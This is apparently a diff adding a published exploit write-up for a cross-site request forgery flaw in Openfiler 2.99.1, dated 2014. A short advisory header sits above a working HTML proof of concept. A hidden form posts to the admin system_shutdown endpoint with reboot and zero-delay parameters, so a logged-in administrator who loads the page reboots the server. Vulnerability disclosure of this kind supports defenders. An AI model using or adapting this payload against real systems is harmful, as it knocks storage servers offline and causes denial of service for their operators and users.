@@ -1,0 +1,47 @@
+<!--
+# Exploit Title: DoS via CSRF in openfiler
+# Exploit author: Dolev Farhi @dolevff
+# Date 07/05/2014
+# Vendor homepage: http://www.openfiler.com
+# Affected Software version: 2.99.1
+# Alerted vendor: 7.5.14
+# CVE: N/A
+ 
+ 
+Software Description
+=====================
+Openfiler is a network storage operating system. With the features we built into Openfiler, you can take advantage of file-based Network Attached Storage and block-based
+Storage Area Networking functionality in a single cohesive framework.
+ 
+ 
+ 
+Vulnerability Description
+=========================
+it is possible to shutdown/reboot a server running openfiler and cause denial of service via CSRF due to missing session tokens.
+ 
+ 
+Steps to reproduce / PoC:
+=========================
+-->
+<html>
+<div align="center">
+<pre>
+
+<h2><b>DoS <b></h2>
+<body>
+<form
+action="https://ip.add.re.ss:446/admin/system_shutdown.html"
+method="POST">
+<input type="hidden" name="shutdowntype" value="reboot" />
+<input type="hidden" name="delay" value="0" />
+<input type="hidden" name="action" value="Shutdown" />
+<input type="submit" name="submit" value="Attack" />
+    </form>
+    </body>
+</div>
+</html>
+ 
+ 
+
+
+
